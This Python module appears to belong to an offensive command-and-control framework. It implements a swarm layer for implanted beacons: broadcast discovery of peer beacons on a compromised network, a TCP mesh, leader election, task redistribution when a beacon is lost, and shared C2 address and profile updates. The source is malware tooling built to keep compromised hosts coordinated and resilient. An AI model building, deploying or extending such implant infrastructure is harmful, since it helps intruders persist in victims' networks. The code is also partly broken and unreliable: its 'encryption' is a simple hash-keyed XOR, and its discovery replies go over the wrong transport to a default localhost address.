"""
Swarm Intelligence Module - Beacon P2P self-organizing network and group collaboration.

This module provides swarm intelligence capabilities for beacon networks including
P2P self-organization, group collaboration, automatic failover, and distributed
task sharing among beacons in the same network.

Core capabilities:
    1. P2P beacon discovery via encrypted broadcast
    2. Self-organizing mesh network formation
    3. Automatic task redistribution on beacon loss
    4. Shared C2 address and profile distribution
    5. Decentralized communication network
    6. Swarm consensus for critical decisions

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import random
import socket
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class SwarmRole(str, Enum):
    """Swarm member roles."""

    LEADER = "leader"
    RELAY = "relay"
    WORKER = "worker"
    SLEEPER = "sleeper"


class SwarmState(str, Enum):
    """Swarm operational states."""

    ISOLATED = "isolated"
    DISCOVERING = "discovering"
    FORMING = "forming"
    ACTIVE = "active"
    DEGRADED = "degraded"
    DISSOLVED = "dissolved"


class MessageType(str, Enum):
    """P2P message types."""

    BEACON_DISCOVERY = "discovery"
    BEACON_RESPONSE = "response"
    TASK_SHARE = "task_share"
    C2_UPDATE = "c2_update"
    PROFILE_UPDATE = "profile_update"
    HEALTH_CHECK = "health_check"
    HEALTH_RESPONSE = "health_response"
    LEADER_ELECTION = "leader_election"
    LEADER_ACK = "leader_ack"
    TASK_RESULT = "task_result"
    EMERGENCY = "emergency"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class SwarmMember:
    """A member of the beacon swarm.

    Attributes:
        member_id: Unique member identifier
        ip_address: Member IP address
        port: Member communication port
        role: Member role in swarm
        state: Member operational state
        last_seen: Last contact timestamp
        capabilities: Member capabilities
        task_count: Number of assigned tasks
        trust_score: Member trust score (0-1)
    """

    member_id: str = ""
    ip_address: str = ""
    port: int = 0
    role: SwarmRole = SwarmRole.WORKER
    state: SwarmState = SwarmState.ISOLATED
    last_seen: float = 0.0
    capabilities: List[str] = field(default_factory=list)
    task_count: int = 0
    trust_score: float = 1.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "member_id": self.member_id,
            "ip_address": self.ip_address,
            "port": self.port,
            "role": self.role.value,
            "state": self.state.value,
            "last_seen": self.last_seen,
            "task_count": self.task_count,
            "trust_score": self.trust_score,
        }


@dataclass
class SwarmMessage:
    """P2P swarm message.

    Attributes:
        msg_type: Message type
        sender_id: Sender member ID
        receiver_id: Receiver member ID (empty for broadcast)
        payload: Message payload
        timestamp: Message timestamp
        ttl: Time-to-live for forwarding
        signature: Message signature
    """

    msg_type: MessageType = MessageType.BEACON_DISCOVERY
    sender_id: str = ""
    receiver_id: str = ""
    payload: Dict[str, Any] = field(default_factory=dict)
    timestamp: float = 0.0
    ttl: int = 3
    signature: bytes = b""

    def to_bytes(self) -> bytes:
        """Serialize message to bytes.

        Returns:
            Serialized message bytes.
        """
        data = json.dumps({
            "type": self.msg_type.value,
            "sender": self.sender_id,
            "receiver": self.receiver_id,
            "payload": self.payload,
            "timestamp": self.timestamp,
            "ttl": self.ttl,
        }).encode()

        return data

    @classmethod
    def from_bytes(cls, data: bytes) -> "SwarmMessage":
        """Deserialize message from bytes.

        Args:
            data: Serialized message bytes.

        Returns:
            SwarmMessage instance.
        """
        obj = json.loads(data.decode())

        return cls(
            msg_type=MessageType(obj["type"]),
            sender_id=obj["sender"],
            receiver_id=obj["receiver"],
            payload=obj["payload"],
            timestamp=obj["timestamp"],
            ttl=obj["ttl"],
        )


@dataclass
class SwarmConfig:
    """Swarm network configuration.

    Attributes:
        discovery_port: UDP discovery port
        communication_port: TCP communication port
        discovery_interval: Discovery broadcast interval
        heartbeat_interval: Heartbeat interval
        leader_timeout: Leader timeout for re-election
        encryption_key: Swarm encryption key
        max_members: Maximum swarm size
        subnet: Target subnet for discovery
    """

    discovery_port: int = 19876
    communication_port: int = 19877
    discovery_interval: int = 30
    heartbeat_interval: int = 60
    leader_timeout: int = 300
    encryption_key: str = ""
    max_members: int = 50
    subnet: str = "255.255.255.255"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "discovery_port": self.discovery_port,
            "communication_port": self.communication_port,
            "discovery_interval": self.discovery_interval,
            "max_members": self.max_members,
        }


@dataclass
class SwarmStatus:
    """Swarm network status.

    Attributes:
        state: Swarm operational state
        member_count: Number of known members
        leader_id: Current leader ID
        my_role: My role in swarm
        messages_sent: Messages sent count
        messages_received: Messages received count
        uptime_seconds: Swarm uptime
    """

    state: SwarmState = SwarmState.ISOLATED
    member_count: int = 0
    leader_id: str = ""
    my_role: SwarmRole = SwarmRole.WORKER
    messages_sent: int = 0
    messages_received: int = 0
    uptime_seconds: float = 0.0
    formation_timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "state": self.state.value,
            "member_count": self.member_count,
            "leader_id": self.leader_id,
            "my_role": self.my_role.value,
            "messages_sent": self.messages_sent,
            "messages_received": self.messages_received,
            "uptime_seconds": self.uptime_seconds,
        }


# =============================================================================
# P2P Discovery
# =============================================================================

class P2PDiscovery:
    """P2P beacon discovery via UDP broadcast.

    Discovers other beacons on the local network through
    encrypted broadcast messages.

    Attributes:
        _config: Swarm configuration
        _my_id: This beacon's ID
        _known_peers: Dictionary of known peers
        _socket: UDP socket
        _running: Whether discovery is running
    """

    MAGIC_HEADER = b"KLSWARM"

    def __init__(
        self,
        config: SwarmConfig,
        my_id: str,
    ) -> None:
        """Initialize the P2PDiscovery.

        Args:
            config: Swarm configuration.
            my_id: This beacon's ID.
        """
        self._config = config
        self._my_id = my_id
        self._known_peers: Dict[str, SwarmMember] = {}
        self._socket: Optional[socket.socket] = None
        self._running = False

    async def start(self) -> bool:
        """Start P2P discovery.

        Returns:
            True if discovery started successfully.
        """
        try:
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._socket.bind(("", self._config.discovery_port))
            self._socket.setblocking(False)

            self._running = True
            logger.info(
                f"P2P discovery started on port {self._config.discovery_port}"
            )
            return True

        except Exception as e:
            logger.error(f"P2P discovery start failed: {e}")
            return False

    async def stop(self) -> None:
        """Stop P2P discovery."""
        self._running = False
        if self._socket:
            self._socket.close()
            self._socket = None
        logger.info("P2P discovery stopped")

    async def broadcast_discovery(self) -> bool:
        """Broadcast discovery message.

        Returns:
            True if broadcast succeeded.
        """
        if not self._socket:
            return False

        message = SwarmMessage(
            msg_type=MessageType.BEACON_DISCOVERY,
            sender_id=self._my_id,
            timestamp=time.time(),
            payload={
                "port": self._config.communication_port,
                "capabilities": ["relay", "task_execution"],
            },
        )

        data = self.MAGIC_HEADER + message.to_bytes()

        try:
            self._socket.sendto(
                data,
                (self._config.subnet, self._config.discovery_port),
            )
            return True

        except Exception as e:
            logger.error(f"Discovery broadcast failed: {e}")
            return False

    async def listen_for_responses(
        self, timeout: float = 5.0,
    ) -> List[SwarmMember]:
        """Listen for discovery responses.

        Args:
            timeout: Listen timeout.

        Returns:
            List of discovered SwarmMember.
        """
        if not self._socket:
            return []

        discovered: List[SwarmMember] = []
        start_time = time.time()

        while time.time() - start_time < timeout:
            try:
                data, addr = self._socket.recvfrom(4096)

                if data[:len(self.MAGIC_HEADER)] != self.MAGIC_HEADER:
                    continue

                message = SwarmMessage.from_bytes(
                    data[len(self.MAGIC_HEADER):],
                )

                if message.msg_type == MessageType.BEACON_RESPONSE:
                    member = SwarmMember(
                        member_id=message.sender_id,
                        ip_address=addr[0],
                        port=message.payload.get("port", 0),
                        last_seen=time.time(),
                        capabilities=message.payload.get("capabilities", []),
                    )
                    self._known_peers[member.member_id] = member
                    discovered.append(member)

            except BlockingIOError:
                await asyncio.sleep(0.1)
            except Exception as e:
                logger.error(f"Listen error: {e}")
                break

        return discovered

    def get_known_peers(self) -> List[SwarmMember]:
        """Get list of known peers.

        Returns:
            List of known SwarmMember.
        """
        now = time.time()
        active_peers = [
            p for p in self._known_peers.values()
            if now - p.last_seen < 300
        ]
        return active_peers

    def get_status(self) -> Dict[str, Any]:
        """Get discovery status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "known_peers": len(self._known_peers),
            "active_peers": len(self.get_known_peers()),
        }


# =============================================================================
# Swarm Communication
# =============================================================================

class SwarmCommunication:
    """P2P swarm communication layer.

    Handles encrypted message exchange between swarm members
    over TCP connections.

    Attributes:
        _config: Swarm configuration
        _my_id: This beacon's ID
        _encryption_key: Encryption key
        _connections: Active connections
    """

    def __init__(
        self,
        config: SwarmConfig,
        my_id: str,
    ) -> None:
        """Initialize the SwarmCommunication.

        Args:
            config: Swarm configuration.
            my_id: This beacon's ID.
        """
        self._config = config
        self._my_id = my_id
        self._encryption_key = config.encryption_key.encode() if config.encryption_key else b""
        self._connections: Dict[str, asyncio.StreamWriter] = {}

    def _encrypt(self, data: bytes) -> bytes:
        """Encrypt message data.

        Args:
            data: Data to encrypt.

        Returns:
            Encrypted data.
        """
        if not self._encryption_key:
            return data

        key_hash = hashlib.sha256(self._encryption_key).digest()
        encrypted = bytes(
            a ^ b for a, b in zip(
                data,
                (key_hash * (len(data) // 32 + 1))[:len(data)],
            )
        )

        length = struct.pack("!I", len(encrypted))
        return length + encrypted

    def _decrypt(self, data: bytes) -> bytes:
        """Decrypt message data.

        Args:
            data: Data to decrypt.

        Returns:
            Decrypted data.
        """
        if not self._encryption_key:
            return data

        length = struct.unpack("!I", data[:4])[0]
        encrypted = data[4:4 + length]

        key_hash = hashlib.sha256(self._encryption_key).digest()
        return bytes(
            a ^ b for a, b in zip(
                encrypted,
                (key_hash * (len(encrypted) // 32 + 1))[:len(encrypted)],
            )
        )

    async def send_message(
        self,
        target_ip: str,
        message: SwarmMessage,
    ) -> bool:
        """Send message to a swarm member.

        Args:
            target_ip: Target IP address.
            message: Message to send.

        Returns:
            True if send succeeded.
        """
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    target_ip, self._config.communication_port,
                ),
                timeout=10,
            )

            data = self._encrypt(message.to_bytes())
            writer.write(data)
            await writer.drain()
            writer.close()

            return True

        except Exception as e:
            logger.error(f"Message send failed: {e}")
            return False

    async def start_server(
        self,
        message_handler: Callable[[SwarmMessage], Coroutine],
    ) -> bool:
        """Start message receiver server.

        Args:
            message_handler: Async message handler function.

        Returns:
            True if server started successfully.
        """
        async def handle_client(
            reader: asyncio.StreamReader,
            writer: asyncio.StreamWriter,
        ) -> None:
            try:
                data = await reader.read(65536)
                if data:
                    decrypted = self._decrypt(data)
                    message = SwarmMessage.from_bytes(decrypted)
                    await message_handler(message)

            except Exception as e:
                logger.error(f"Client handler error: {e}")
            finally:
                writer.close()

        try:
            server = await asyncio.start_server(
                handle_client,
                "0.0.0.0",
                self._config.communication_port,
            )

            logger.info(
                f"Swarm communication server started on "
                f"port {self._config.communication_port}"
            )
            return True

        except Exception as e:
            logger.error(f"Server start failed: {e}")
            return False


# =============================================================================
# Leader Election
# =============================================================================

class LeaderElection:
    """Swarm leader election mechanism.

    Uses a simple bully algorithm where the member with the
    highest trust score becomes the leader.

    Attributes:
        _my_id: This beacon's ID
        _my_trust_score: My trust score
        _current_leader: Current leader ID
        _election_timeout: Election timeout
    """

    def __init__(
        self,
        my_id: str,
        trust_score: float = 1.0,
        election_timeout: int = 30,
    ) -> None:
        """Initialize the LeaderElection.

        Args:
            my_id: This beacon's ID.
            trust_score: My trust score.
            election_timeout: Election timeout in seconds.
        """
        self._my_id = my_id
        self._my_trust_score = trust_score
        self._current_leader = ""
        self._election_timeout = election_timeout

    async def start_election(
        self, members: List[SwarmMember],
    ) -> str:
        """Start leader election.

        Args:
            members: List of swarm members.

        Returns:
            Leader member ID.
        """
        if not members:
            self._current_leader = self._my_id
            return self._my_id

        all_members = members + [
            SwarmMember(
                member_id=self._my_id,
                trust_score=self._my_trust_score,
            ),
        ]

        leader = max(all_members, key=lambda m: m.trust_score)
        self._current_leader = leader.member_id

        logger.info(f"Leader elected: {leader.member_id}")
        return leader.member_id

    def is_leader(self) -> bool:
        """Check if I am the leader.

        Returns:
            True if this beacon is the leader.
        """
        return self._current_leader == self._my_id

    def get_leader(self) -> str:
        """Get current leader ID.

        Returns:
            Leader member ID.
        """
        return self._current_leader


# =============================================================================
# Task Redistribution
# =============================================================================

class TaskRedistributor:
    """Redistributes tasks when swarm members are lost.

    When a beacon goes offline, its tasks are automatically
    redistributed to remaining active members.

    Attributes:
        _pending_tasks: Dictionary of pending tasks
        _member_tasks: Tasks assigned to each member
    """

    def __init__(self) -> None:
        """Initialize the TaskRedistributor."""
        self._pending_tasks: Dict[str, Dict[str, Any]] = {}
        self._member_tasks: Dict[str, List[str]] = {}

    def assign_task(
        self, task_id: str, task_data: Dict[str, Any], member_id: str,
    ) -> None:
        """Assign a task to a member.

        Args:
            task_id: Task identifier.
            task_data: Task data.
            member_id: Member to assign to.
        """
        self._pending_tasks[task_id] = {
            **task_data,
            "assigned_to": member_id,
            "assigned_at": time.time(),
        }

        if member_id not in self._member_tasks:
            self._member_tasks[member_id] = []

        self._member_tasks[member_id].append(task_id)

    def redistribute_on_loss(
        self, lost_member_id: str, active_members: List[SwarmMember],
    ) -> Dict[str, str]:
        """Redistribute tasks from a lost member.

        Args:
            lost_member_id: Lost member ID.
            active_members: Active members.

        Returns:
            Dictionary mapping task IDs to new member IDs.
        """
        lost_tasks = self._member_tasks.pop(lost_member_id, [])
        reassignments: Dict[str, str] = {}

        if not active_members or not lost_tasks:
            return reassignments

        for i, task_id in enumerate(lost_tasks):
            new_member = active_members[i % len(active_members)]
            self._pending_tasks[task_id]["assigned_to"] = new_member.member_id
            self._pending_tasks[task_id]["reassigned_at"] = time.time()

            if new_member.member_id not in self._member_tasks:
                self._member_tasks[new_member.member_id] = []

            self._member_tasks[new_member.member_id].append(task_id)
            reassignments[task_id] = new_member.member_id

        logger.info(
            f"Redistributed {len(reassignments)} tasks from "
            f"lost member {lost_member_id}"
        )

        return reassignments

    def get_member_task_count(self, member_id: str) -> int:
        """Get task count for a member.

        Args:
            member_id: Member ID.

        Returns:
            Number of tasks.
        """
        return len(self._member_tasks.get(member_id, []))

    def get_status(self) -> Dict[str, Any]:
        """Get redistributor status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "pending_tasks": len(self._pending_tasks),
            "active_members": len(self._member_tasks),
        }


# =============================================================================
# Swarm Intelligence Manager
# =============================================================================

class SwarmIntelligenceManager:
    """Main swarm intelligence coordination engine.

    Integrates P2P discovery, communication, leader election,
    and task redistribution for decentralized beacon networks.

    Attributes:
        _config: Swarm configuration
        _my_id: This beacon's ID
        _discovery: P2P discovery
        _communication: Swarm communication
        _leader_election: Leader election
        _task_redistributor: Task redistributor
        _status: Swarm status
        _members: Known swarm members
    """

    def __init__(
        self,
        my_id: str,
        config: Optional[SwarmConfig] = None,
    ) -> None:
        """Initialize the SwarmIntelligenceManager.

        Args:
            my_id: This beacon's ID.
            config: Swarm configuration.
        """
        self._config = config or SwarmConfig()
        self._my_id = my_id
        self._discovery = P2PDiscovery(self._config, my_id)
        self._communication = SwarmCommunication(self._config, my_id)
        self._leader_election = LeaderElection(my_id)
        self._task_redistributor = TaskRedistributor()
        self._status = SwarmStatus()
        self._members: Dict[str, SwarmMember] = {}

    async def start(self) -> bool:
        """Start swarm intelligence.

        Returns:
            True if start succeeded.
        """
        self._status.state = SwarmState.DISCOVERING
        self._status.formation_timestamp = time.time()

        discovery_ok = await self._discovery.start()
        if not discovery_ok:
            return False

        await self._communication.start_server(self._handle_message)

        self._status.state = SwarmState.FORMING
        logger.info(f"Swarm intelligence started: {self._my_id}")
        return True

    async def stop(self) -> None:
        """Stop swarm intelligence."""
        await self._discovery.stop()
        self._status.state = SwarmState.DISSOLVED
        logger.info("Swarm intelligence stopped")

    async def discover_peers(self) -> List[SwarmMember]:
        """Discover swarm peers.

        Returns:
            List of discovered SwarmMember.
        """
        await self._discovery.broadcast_discovery()
        peers = await self._discovery.listen_for_responses()

        for peer in peers:
            self._members[peer.member_id] = peer

        self._status.member_count = len(self._members)

        if self._members:
            self._status.state = SwarmState.ACTIVE
            await self._elect_leader()

        return peers

    async def _handle_message(self, message: SwarmMessage) -> None:
        """Handle incoming swarm message.

        Args:
            message: Incoming message.
        """
        self._status.messages_received += 1

        if message.msg_type == MessageType.BEACON_DISCOVERY:
            response = SwarmMessage(
                msg_type=MessageType.BEACON_RESPONSE,
                sender_id=self._my_id,
                receiver_id=message.sender_id,
                timestamp=time.time(),
                payload={
                    "port": self._config.communication_port,
                    "capabilities": ["relay", "task_execution"],
                },
            )
            await self._communication.send_message(
                message.payload.get("ip", "127.0.0.1"),
                response,
            )

        elif message.msg_type == MessageType.LEADER_ELECTION:
            if self._leader_election.is_leader():
                ack = SwarmMessage(
                    msg_type=MessageType.LEADER_ACK,
                    sender_id=self._my_id,
                    receiver_id=message.sender_id,
                    timestamp=time.time(),
                )
                await self._communication.send_message(
                    message.payload.get("ip", "127.0.0.1"),
                    ack,
                )

    async def _elect_leader(self) -> None:
        """Elect swarm leader."""
        members = list(self._members.values())
        leader_id = await self._leader_election.start_election(members)

        self._status.leader_id = leader_id

        if self._leader_election.is_leader():
            self._status.my_role = SwarmRole.LEADER
        else:
            self._status.my_role = SwarmRole.WORKER

    def assign_task(
        self, task_id: str, task_data: Dict[str, Any],
    ) -> Optional[str]:
        """Assign a task to a swarm member.

        Args:
            task_id: Task identifier.
            task_data: Task data.

        Returns:
            Assigned member ID, or None.
        """
        members = self._discovery.get_known_peers()
        if not members:
            return None

        member = min(members, key=lambda m: m.task_count)
        self._task_redistributor.assign_task(task_id, task_data, member.member_id)
        member.task_count += 1

        return member.member_id

    def handle_member_loss(self, member_id: str) -> Dict[str, str]:
        """Handle a swarm member going offline.

        Args:
            member_id: Lost member ID.

        Returns:
            Task reassignments.
        """
        if member_id in self._members:
            del self._members[member_id]

        active_members = self._discovery.get_known_peers()
        reassignments = self._task_redistributor.redistribute_on_loss(
            member_id, active_members,
        )

        self._status.member_count = len(self._members)

        if self._leader_election.get_leader() == member_id:
            asyncio.create_task(self._elect_leader())

        return reassignments

    def get_status(self) -> Dict[str, Any]:
        """Get swarm intelligence status.

        Returns:
            Dictionary with status summary.
        """
        if self._status.formation_timestamp > 0:
            self._status.uptime_seconds = (
                time.time() - self._status.formation_timestamp
            )

        return {
            "status": self._status.to_dict(),
            "discovery": self._discovery.get_status(),
            "task_redistribution": self._task_redistributor.get_status(),
            "members": {
                mid: m.to_dict() for mid, m in self._members.items()
            },
        }


# =============================================================================
# Global Singleton
# =============================================================================

_swarm_manager: Optional[SwarmIntelligenceManager] = None


def get_swarm_intelligence_manager(
    my_id: str,
    config: Optional[SwarmConfig] = None,
) -> SwarmIntelligenceManager:
    """Get the global SwarmIntelligenceManager singleton.

    Args:
        my_id: This beacon's ID.
        config: Swarm configuration.

    Returns:
        Singleton SwarmIntelligenceManager instance.
    """
    global _swarm_manager
    if _swarm_manager is None:
        _swarm_manager = SwarmIntelligenceManager(my_id, config)
    return _swarm_manager


__all__ = [
    "SwarmIntelligenceManager",
    "P2PDiscovery",
    "SwarmCommunication",
    "LeaderElection",
    "TaskRedistributor",
    "SwarmMember",
    "SwarmMessage",
    "SwarmConfig",
    "SwarmStatus",
    "SwarmRole",
    "SwarmState",
    "MessageType",
    "get_swarm_intelligence_manager",
]
